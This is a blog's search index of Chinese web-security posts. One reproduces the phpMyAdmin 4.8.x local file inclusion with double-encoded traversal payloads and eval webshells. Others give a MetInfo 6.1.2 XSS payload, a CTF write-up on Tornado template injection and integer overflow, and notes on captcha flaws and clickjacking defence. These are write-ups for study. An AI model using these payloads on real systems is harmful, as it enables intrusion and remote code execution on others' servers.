<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>phpMyAdmin 4.8.x 本地文件包含</title>
      <link href="/archives/767136e1/"/>
      <url>/archives/767136e1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p><p><img src="" alt="img"></p><p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p><p>首先，我们满足4个条件：</p><p>1．传入的target 需要是一个字符串。</p><p>2．不能以/index/ 开头。</p><p>3．不能在$target_blacklist数组内。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\052347bd2743c4b4c356996d842359de.png" alt="img"></p><p>4．满足checkPageValidity函数要求。</p><p>跟踪一下checkPageValidity函数</p><p>在/libraries/classes/Core.php  443行:</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p><p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84f51699726302cc72be152d425b380b.png" alt="img"></p><p>我们先看第一个返回true的地方。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p><p>这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p><p>再来看第二个</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p><p>先介绍下这些函数的作用：</p><p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p><p>mb_substr()函数的意思是：</p><pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p><p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p><p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p><p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p><p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p><p>再来看第三个：</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p><p>第三个和第二个对比多出了个urldecode()函数。</p><p>而问题恰恰出在了这个urldecode()函数。</p><p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p><p>原因是：</p><p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p><p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p><p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p><pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_5.png" alt="VulnSpy"></p><ol><li>获取自己的SESSION ID</li></ol><p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_6.png" alt="VulnSpy"></p><p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p><ol><li>包含SESSION文件，成功利用该漏洞</li></ol><pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\exp_7.png" alt="VulnSpy"></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p><p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p><p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p><pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd</code></pre><p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p><p>方法二：利用mysql的data文件：</p><p>不用写文件也能拿Shell的方法。</p><p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p><p>创建一个名为abc的表，并且字段设置为</p><pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p><p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p><p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p><pre><code>show variables like &#39;%datadir%&#39;;</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\b071d225a03774b04f057f324a390a17.png" alt="img"></p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p><p>其中，abc.frm文件内容</p><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p><p>Payload：</p><pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm</code></pre><p><img src="D:\my write markdown\data\01-Web Security\1.1-CVE复现\bebfd31b0d63a338eee12cda98393928.png" alt="img"></p><p>方法三：包含本地系统文件</p><p>Payload:</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></pre><h2 id="0x03-参考文章漏洞细节"><a href="#0x03-参考文章漏洞细节" class="headerlink" title="0x03 参考文章漏洞细节"></a>0x03 参考文章漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>验证码相关安全问题</title>
      <link href="/archives/b46a6d47/"/>
      <url>/archives/b46a6d47/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-乌云知识库"><a href="#0x00-乌云知识库" class="headerlink" title="0x00 乌云知识库:"></a>0x00 乌云知识库:</h2><ul><li><a href="http://drops.ichenfei.com/web-5459.html" target="_blank" rel="external">验证码安全问题汇总</a></li><li><a href="http://drops.ichenfei.com/tips-141.html" target="_blank" rel="external">聊一聊随机数安全</a></li><li><a href="http://drops.ichenfei.com/web-5048.html" target="_blank" rel="external">密码找回逻辑漏洞总结</a></li><li><a href="http://drops.ichenfei.com/papers-2035.html" target="_blank" rel="external">一些常见的重置密码漏洞分析整理</a></li></ul><h2 id="0x01-其他相关文章"><a href="#0x01-其他相关文章" class="headerlink" title="0x01 其他相关文章"></a>0x01 其他相关文章</h2><ul><li><a href="http://www.cnbraid.com/2016/captcha.html" target="_blank" rel="external">【安全加固】 验证码的实现原理和安全问题汇总</a></li><li><a href="http://blog.csdn.net/niaonao/article/details/51112686" target="_blank" rel="external">验证码原理分析及实现</a></li><li><a href="https://lizonghang.github.io/2016/07/10/%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%AD%97%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E3%80%81%E7%94%9F%E6%88%90%E5%92%8C%E7%A0%B4%E8%A7%A3/" target="_blank" rel="external">随机数字图片验证码的原理、生成和破解</a></li><li><a href="http://www.lijiejie.com/safe-issues-of-captcha/" target="_blank" rel="external">图形验证码的常见安全问题</a></li></ul><h2 id="0x02-乌云相关案例"><a href="#0x02-乌云相关案例" class="headerlink" title="0x02 乌云相关案例"></a>0x02 乌云相关案例</h2><ul><li><a href="http://wy.ichenfei.com/searchbug.php?q=%E9%AA%8C%E8%AF%81%E7%A0%81" target="_blank" rel="external">http://wy.ichenfei.com/searchbug.php?q=验证码</a>  <!-- - [http://es.ichenfei.com:8000/wysearch/?q=验证码](http://es.ichenfei.com:8000/wysearch/?q=验证码) --></li></ul><h2 id="0x03-验证码实现原理"><a href="#0x03-验证码实现原理" class="headerlink" title="0x03 验证码实现原理"></a>0x03 验证码实现原理</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201810240004_376.jpg" alt=""></p><ol><li>客户端发起一个请求；</li><li>服务端响应并创建一个新的SessionID同时生成一个随机验证码；</li><li>服务端将验证码和SessionID一并返回给客户端；</li><li>客户端提交验证码连同SessionID给服务端；</li><li>服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。</li></ol><p>根据上面的实现流程，可以从四个方面入手，<strong>客户端问题</strong>、<strong>服务端问题</strong>、<strong>验证码本身问题</strong>,还有一个<strong>验证码流程设计</strong>问题。</p><h2 id="0x04-客户端问题"><a href="#0x04-客户端问题" class="headerlink" title="0x04 客户端问题"></a>0x04 客户端问题</h2><ul><li>客户端生成验证码<ul><li>验证码由客户端js生成并且仅仅在客户端用js验证</li></ul></li><li>验证码输出客户端<ul><li>输出在html中（神一样的程序员）</li></ul></li><li>验证码输出在cookie中，这个在乌云中案例也是比较多的。</li></ul><h2 id="0x05-服务端问题"><a href="#0x05-服务端问题" class="headerlink" title="0x05 服务端问题"></a>0x05 服务端问题</h2><ul><li>验证码不过期，没有及时销毁会话导致验证码复用<ul><li>这个是最常见的，乌云上面有大量的案例。</li></ul></li><li>没有进行非空判断<ul><li>很多时候，我们会遗留掉了验证过程中验证码为空的情况</li><li>比如去掉cookie中的某些值或者请求中验证码参数</li></ul></li><li>产生的验证码问题集内的答案非常有限</li></ul><h2 id="0x06-其他类型验证码绕过"><a href="#0x06-其他类型验证码绕过" class="headerlink" title="0x06 其他类型验证码绕过"></a>0x06 其他类型验证码绕过</h2><p>pkav http fuzzer工具可以简单绕过数字型验证码</p><p>基于机器学习识别验证码</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Xss in MetInfo V6.1.2</title>
      <link href="/archives/a5c61176/"/>
      <url>/archives/a5c61176/</url>
      
        <content type="html"><![CDATA[<h1 id="Xss-in-MetInfo-V6-1-2"><a href="#Xss-in-MetInfo-V6-1-2" class="headerlink" title="Xss in MetInfo V6.1.2"></a>Xss in MetInfo V6.1.2</h1><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The vulnerability exists in the MetInfo6.1.2/admin/index.php page. Due to the lazy filtering of the parameter anyid, the XSS vulnerability is caused.</p><h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The affected page located in admin’s management page:MetInfo6.1.2\admin\</p><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>To build a website locally, first login to the website background: <a href="http://localhost/MetInfo6.1.2/admin/" target="_blank" rel="external">http://localhost/MetInfo6.1.2/admin/</a>. After the login is successful, construct the payload:</p><p>Xss vulnerability exists</p><pre><code>http://localhost:9096/MetInfo6.1.2/admin/index.php?lang=cn&amp;anyid=47oaflb%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3emwq3k&amp;n=admin&amp;c=admin_admin&amp;a=doadd</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201810160210_976.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>护网杯wp</title>
      <link href="/archives/173905c2/"/>
      <url>/archives/173905c2/</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>进入首页，看到文件列表。</p><p><a href="http://49.4.94.186:31331/" target="_blank" rel="external">http://49.4.94.186:31331/</a></p><p>随便点一个，可以读取文件内容，看到url里有两个参数，一个是文件名，另一个是签名。</p><p>根据 hint.txt ， 签名是 cookie_secret + 文件名 的 md5</p><pre><code>hint.txtmd5(cookie_secret + md5(filename))</code></pre><p><a href="http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=Orz.txt&amp;signature=25d5cc7447f6e6a5785004b0a3362d6c</a></p><p>通过 FUZZ 参数，发现新的路由，即报错页面。</p><p><a href="http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF" target="_blank" rel="external">http://49.4.94.186:31331/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF</a></p><p>看到参数的 <code>签名错误</code> 被输出到页面里，应该是 SSTI。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\xleEWng.png" alt=""></p><p>另外学习：</p><p><a href="http://blog.51cto.com/wengmengkai/1844886" target="_blank" rel="external">tornado—web框架基础入门</a> 通过这个进行快速学习tornado的开发</p><p><a href="http://www.tornadoweb.org/en/stable/" target="_blank" rel="external">tornado文档</a> 通过阅读文档快速掌握对象</p><p>安装:</p><pre><code>pip install tornado</code></pre><p>官方demo</p><pre><code class="python">import tornado.ioloopimport tornado.web# import uimodules as md# import uimethods as mtclass MainHandler(tornado.web.RequestHandler):    def get(self):        self.write(&quot;Hello, world&quot;)settings = {    &#39;template_path&#39;: &#39;views&#39;,        # html文件    &#39;static_path&#39;: &#39;statics&#39;,        # 静态文件（css,js,img）    &#39;static_url_prefix&#39;: &#39;/statics/&#39;,        # 静态文件前缀    &#39;cookie_secret&#39;: &#39;suoning&#39;,        # cookie自定义字符串加盐    # &#39;xsrf_cookies&#39;: True,         # 防止跨站伪造    # &#39;ui_methods&#39;: mt,           # 自定义UIMethod函数    # &#39;ui_modules&#39;: md,           # 自定义UIModule类}application = tornado.web.Application([    (r&quot;/&quot;, MainHandler),], **settings)if __name__ == &quot;__main__&quot;:    application.listen(8888)    tornado.ioloop.IOLoop.instance().start()</code></pre><p>通过<code>application = tornado.web.Application([(r&quot;/&quot;, MainHandler),], **settings)</code></p><p>很明显可以知道 cookie_secret 在RequestHandler这个对象里面</p><p>然后根据<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="external">Tornado小记 – 模板中的Handler</a></p><blockquote><p>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings了！</p></blockquote><p>就知道怎么通过模版注入 </p><p>模版注入绕过:<a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="external">Flask/Jinja2模板注入中的一些绕过姿势</a></p><p>里面的payload 基本都包含 () 很明显题目过滤了 只保留了. 所以通过上面别名的方法来获得cookie_secret</p><p>可以通过这个 msg= 直接读出 tornado 的配置。</p><p><img src="D:\my write markdown\data\02-CTF\2.0-writeup\jl6Wwoc.png" alt=""></p><p>找到了 cookie_secret，根据 hint，构造 url</p><p>/fllllllllllag</p><p>{BVt!-e%cqXs<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x26;&#x6c;&#x6e;&#41;&#x24;&#x37;&#95;&#x78;&#x49;&#64;&#x77;&#74;&#48;&#80;&#65;&#x5e;&#57;&#81;&#49;&#x23;&#56;&#63;&#x6b;&#x68;&#x6a;&#x28;&#x34;&#97;&#111;&#50;&#x75;&#x72;&#67;&#98;&#x4c;&#x33;&#72;&#x45;&#126;&#x2e;&#71;&#112;&#x7a;&#70;&#x66;">&#x26;&#x6c;&#x6e;&#41;&#x24;&#x37;&#95;&#x78;&#x49;&#64;&#x77;&#74;&#48;&#80;&#65;&#x5e;&#57;&#81;&#49;&#x23;&#56;&#63;&#x6b;&#x68;&#x6a;&#x28;&#x34;&#97;&#111;&#50;&#x75;&#x72;&#67;&#98;&#x4c;&#x33;&#72;&#x45;&#126;&#x2e;&#71;&#112;&#x7a;&#70;&#x66;</a>[YKSg</p><pre><code class="php">&lt;?php$str = &quot;/fllllllllllag&quot;;$a=md5($str);$str2 = &quot;{BVt!-e%cqXs&lt;&amp;ln)$7_xI@wJ0PA^9Q1#8?khj(4ao2urCbL3HE~.GpzFf&gt;[YKSg&quot;;$str3=$str2.$a;echo md5($str3);?&gt;</code></pre><p>2ad507bc2e8b59cce2e4147b0bfa169f</p><p><a href="http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f" target="_blank" rel="external">http://49.4.94.186:31331/file?filename=/fllllllllllag&amp;signature=2ad507bc2e8b59cce2e4147b0bfa169f</a></p><p>flag{fd29ee3314ce32fedce028ca753fb68a}</p><h3 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h3><p>本题的考点在于条件竞争以及整数的溢出问题</p><p>通过多线程发包的方式使得购买到 5 个以上的大辣条</p><p>可以使用burp抓包，发送到intruder</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181352_259.png" alt=""></p><p>设线程大一点</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201810181402_632.png" alt=""></p><p>start stack</p><p>得到10个大辣条越换两个辣条之王</p><p>抓包发现cookie有go_iris 猜测是go语言数据类型溢出</p><p>由于go使用强类型语言，猜测是整数溢出。 最后测试出是unsigned __int64,而uint64范围为18446744073709551615， 5个大辣条换一个辣条之王。</p><p>这里遇到了很大坑一开始我们一直用18446744073709551616，然后比赛完才发现要除以为除以5，所以最后num=3689348814741910324，那么要花费18446744073709551620个大辣条，超出uint64范围转换为5。</p><p>payload：</p><p>num=3689348814741910324</p><h3 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h3><p><a href="https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95" target="_blank" rel="external">https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95</a></p><p><a href="https://www.anquanke.com/post/id/161849" target="_blank" rel="external">https://www.anquanke.com/post/id/161849</a></p><p><code>ez_laravel</code>给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。</p><p><a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="external">https://github.com/sco4x0/huwangbei2018_easy_laravel</a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="迟来的签到题"><a href="#迟来的签到题" class="headerlink" title="迟来的签到题"></a>迟来的签到题</h3><pre><code class="python">import base64tmp=&quot;&quot;string = &quot;AAoHAR1TJ1clUFYjVSRRV1cnIiUiV1BeUFNeIlBXI1BVI1UlUBs=&quot;string2 = base64.b64decode(string)print(string2)for i in range(1,256):    for j in string2:        tmp = tmp + chr(ord(j) ^ i)    print(tmp)    tmp=&quot;&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>web漏洞挖掘之点击劫持漏洞</title>
      <link href="/archives/95d370e7/"/>
      <url>/archives/95d370e7/</url>
      
        <content type="html"><![CDATA[<h1 id="web漏洞挖掘之点击劫持漏洞"><a href="#web漏洞挖掘之点击劫持漏洞" class="headerlink" title="web漏洞挖掘之点击劫持漏洞"></a>web漏洞挖掘之点击劫持漏洞</h1><h2 id="0x00-点击劫持的概念"><a href="#0x00-点击劫持的概念" class="headerlink" title="0x00 点击劫持的概念"></a>0x00 点击劫持的概念</h2><p>点击劫持clickjacking，也叫UI-覆盖攻击（UI redress attack）；最早是在2008年，由互联网安全专家罗伯特·汉森和耶利米·格劳斯曼首创。</p><p>百度百科上对其的定义如下： 它是通过覆盖不可见的框架误导受害者点击。 虽然受害者点击的是他所看到的网页，但其实他所点击的是被黑客精心构建的另一个置于原网页上面的透明页面。 这种攻击利用了HTML中<code>&lt;iframe&gt;</code>标签的透明属性  </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112329_760.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112329_533.png" alt=""></p><p>图片中，都是进行了iframe嵌套，构成一个页面 来诱使用户进行点击。 以上就是点击劫持的一个基本概念 </p><h2 id="0x01点击劫持攻击的原理"><a href="#0x01点击劫持攻击的原理" class="headerlink" title="0x01点击劫持攻击的原理"></a>0x01点击劫持攻击的原理</h2><p>点击劫持实际上是一种视觉上的欺骗手段，攻击者通过利用一个透明的、不可见的iframe，覆盖在某网页上，然后诱导用户在该网页上进行点击等操作，而此时用户在不知情的情况下点击了透明的iframe页面 。攻击者通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。 如使用css调整图片大小位置，通过设置opacity参数调整元素透明度等；目的都是让用户就无法看到含恶意代码的目标网页。 </p><p>这是点击劫持的原理，关键在于构造不可见的透明iframe来进行利用； </p><h2 id="0x02-挖掘的思路"><a href="#0x02-挖掘的思路" class="headerlink" title="0x02 挖掘的思路"></a>0x02 挖掘的思路</h2><p>1.我们只需要创建一个iframe的页面嵌套就可以简单的测试 </p><p>如果目标应用支持iframe进行页面嵌套，那么基本断定网站存在点击劫持攻击漏洞 比如<code>&lt;iframe src=&quot;http://target.com&quot;/&gt;</code> ，假设该页面上显示hello world 如果通过iframe嵌套后能显示为 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112339_70.png" alt=""></p><p>基本就能确定存在点击劫持风险 </p><p>2.通过目标的HTTP响应头是否设置好了X-Frame-Options字段，是否有JavaScript的Frame Busting机制，也可以进行判断 ，比如在用常见的WVS进行网站扫描时，会经常看到这样的信息： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112340_436.jpg" alt=""></p><p>这就是通过判断是否存在X-Frame-Options响应头来处理 其他辅助工具进行clickjacking漏洞探测的时候，也都基本上基于以上情况进行处理 </p><h2 id="0x03-举列子"><a href="#0x03-举列子" class="headerlink" title="0x03 举列子"></a>0x03 举列子</h2><p>这两处代码截图是github上的clickjacking扫描的代码，可以参考：<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/D4Vinci/Clickjacking-Tester</a> <a href="qq://txfile/#" target="_blank" rel="external">https://github.com/LTF1633242320/D-TECT</a> </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112341_651.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112341_810.png" alt=""></p><p>点击劫持 主要是靠点击，也有通过拖拽进行劫持实现的 </p><p>这种点击劫持的案例，比较知名的包括：Facebook 的‘likejacking’攻击、Adobe Flash Player 网站漏洞、Twitter 的 Don’t click 攻击、谷歌账户点击劫持攻击等 </p><p>在诸多点击劫持案例中，最为经典的案例是攻击者通过flash构造出点击劫持，最终控制用户电脑摄像头事件; </p><p>首先，攻击者构造一个flash小游戏，并贴心逼真地显示了游戏得分以及游戏耗时，诱导用户试玩；在试玩过程中引导用户点击不停变换位置的“click”按钮， 而其实在游戏界面中隐藏了一个看不见的iframe </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112354_232.png" alt=""></p><p>攻击通过诱导用户使用鼠标点击看似随意的位置，来完成较为复杂的操作。 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112355_209.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_575.png" alt=""></p><p>并最终开启了用户的摄像头 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_551.png" alt=""></p><p>某浪博客关注点击劫持 </p><p>在新浪博客的“加关注”处： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112356_303.jpg" alt=""></p><p>通过简单构造的html页面，如下， </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_673.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_64.png" alt=""></p><p>通过构造iframe 从而进行博客关注数量的刷新 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112357_869.jpg" alt=""></p><p>当然可以再对html页面进行精心美化调整，从而大面积进行点击劫持攻击的实施。 分享一个github上的类似开启摄像头的一个demo，可以在做安全意识培训是当演示了<a href="qq://txfile/#" target="_blank" rel="external">https://github.com/thomaspatzke/Clickjacking-Exploit</a></p><p>低版本IE时代的东西了吧 用浏览器插件 </p><p>html5可以直接调用摄像头  前段时间有朋友搞得一个xss用HTML5调用摄像头，直接可以看到使用者照片 </p><h2 id="0x04-点击劫持与其他漏洞结合效果"><a href="#0x04-点击劫持与其他漏洞结合效果" class="headerlink" title="0x04 点击劫持与其他漏洞结合效果"></a>0x04 点击劫持与其他漏洞结合效果</h2><p>可以配合CSRF  </p><p>反射型xss可以和点击劫持一起形成差不多储存型xss的效果</p><p>反射XSS直接利用需要对方点击，如果直接把包含反射XSS的链接发送给受害者，比较唐突难以利用，所以如果将点击劫持与反射xss结合起来，利用iframe嵌套诱导，也就基本能达到存储XSS的效果 </p><h2 id="0x05-点击劫持漏洞的防御方法"><a href="#0x05-点击劫持漏洞的防御方法" class="headerlink" title="0x05 点击劫持漏洞的防御方法"></a>0x05 点击劫持漏洞的防御方法</h2><p>点击劫持漏洞的防御 主要是两种，一个是通过Frame busting防御、一种是通过添加X-Frame-Options属性进行防御 </p><p>frame busting防御，通过js代码禁止iframe的嵌套，如判断顶层窗口跳转： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112359_756.png" alt=""></p><p>下面是一些常见Frame busting： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808112359_295.png" alt=""></p><p>但frame busting存在被绕过的可能，如多层iframe嵌套等； 在HTML 5中iframe的sandbox属性、IE中iframe的security属性等，都可以限制iframe页面中的脚本执行，从而可以使得frame busting失效 ,比如在html5中进行绕过：设置<iframe>属性：sandbox </iframe></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120000_760.png" alt=""></p><p>当sandbox 仅设置为allow-forms时，js是不被执行的 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120000_246.png" alt=""></p><p>设置<iframe>属性：security；当security设置为restricted后，frame中的脚本也将不能执行；但仅限于IE ，如此一来，由于无法执行js脚本，则通过JS来判断顶层跳转将失败 </iframe></p><p>第二种方式，设置X-Frame-Options属性； X-Frame-Options是一个微软提出的一个HTTP响应头；用来给浏览器指示允许一个页面可否在 <frame>, <iframe> 或者 <object> 中展现的标记。 </object></iframe></p><p>通过设置X-Frame-Options 阻止站点内的页面被其他页面嵌入从而防止点击劫持；这是目前处理点击劫持攻击的最优且最可靠的手段； X-Frame-Options 的三个可选值：  Ø    DENY  Ø    SAMEORIGIN  Ø    ALLOW-FROM origin </p><p>以下是这三个可选值的表义： 如果设置为 DENY，表示该页面不允许在 frame 中展示，即便是在同源域名的页面中嵌套也不允许； </p><p>如果设置为 SAMEORIGIN，表示该页面可以在同源域名页面的 frame 中嵌套展示； 如果设置为 ALLOW-FROM，表示该页面可以在指定来源的 frame 中嵌套展示（origin为允许frame加载的页面地址）； </p><p>在各个平台中间件中X-Frame-Options的配置不一样， 在IIS环境中，在web站点的web.config中配置。 </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_277.png" alt=""></p><p>在apache中： 先开启mod_<a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>，即在httpd.conf中去掉“LoadModule headers<em>module modules/mod</em><a href="qq://txfile/#" target="_blank" rel="external">headers.so</a>”前的#； 再.修改httpd.conf，添加下面内容：Header always append X-Frame-Options DENY 修改完如下: </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_486.png" alt=""></p><p>如果同一台apache服务器上有多个站点，只想针对其中一个站点进行配置，可以修改.htaccess文件，添加如下内容： Header append X-FRAME-OPTIONS “DENY” </p><p>如果是nginx，则修改nginx.conf,在server下添加下面内容： add_header X-Frame-Options “DENY”; 添加完成如下： </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201808120001_76.png" 